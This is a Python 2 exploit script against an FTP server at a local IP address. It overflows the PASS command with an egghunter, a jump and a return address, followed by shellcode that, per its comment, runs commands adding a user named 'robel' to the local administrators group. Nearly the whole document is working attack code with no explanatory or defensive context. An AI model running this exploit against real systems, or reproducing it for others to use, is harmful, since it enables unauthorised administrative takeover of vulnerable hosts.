#!/usr/bin/python

import sys,os,struct,socket

host = '192.168.1.29'
port = 21

# Bad characters: "\x0a"

# net user robel robel /add & net localgroup administrators robel /add
shellcode = ("\x31\xc0"
"\x50"
"\x68\x2f\x61\x64\x64"
"\x68\x62\x65\x6c\x20"
"\x68\x73\x20\x72\x6f"
"\x68\x61\x74\x6f\x72"
"\x68\x69\x73\x74\x72"
"\x68\x64\x6d\x69\x6e"
"\x68\x75\x70\x20\x61"
"\x68\x6c\x67\x72\x6f"
"\x68\x6c\x6f\x63\x61"
"\x68\x6e\x65\x74\x20"
"\x68\x64\x20\x26\x20"
"\x68\x20\x2f\x61\x64"
"\x68\x6f\x62\x65\x6c"
"\x68\x65\x6c\x20\x72"
"\x68\x20\x72\x6f\x62"
"\x68\x75\x73\x65\x72"
"\x68\x6e\x65\x74\x20"
"\x89\xE0"
"\x6A\x01"
"\x50" 
"\xBB\xc7\x93\xc2\x77"
"\xFF\xD3"
)

egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a"
"\x74\xef\xb8\x57\x30\x30\x54\x89\xd7\xaf\x75\xea\xaf\x75\xe7"
"\xff\xe7")

payload = 'A' * (793 - len(egghunter)) # Original offset @ 797 
payload += egghunter
payload += '\xeb\xde\x90\x90'
payload +=  struct.pack("<I",0x00433038) # 00433038  |. 5E             POP ESI
payload += 'W00TW00T'
payload += shellcode
payload += 'D' * (5000 - len(payload))

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host,port))
print sock.recv(1024)
sock.send("USER user\r\n")
print sock.recv(1024)
sock.send("PASS /.:/" + payload + "\r\n")
sock.recv(1024)
sock.close()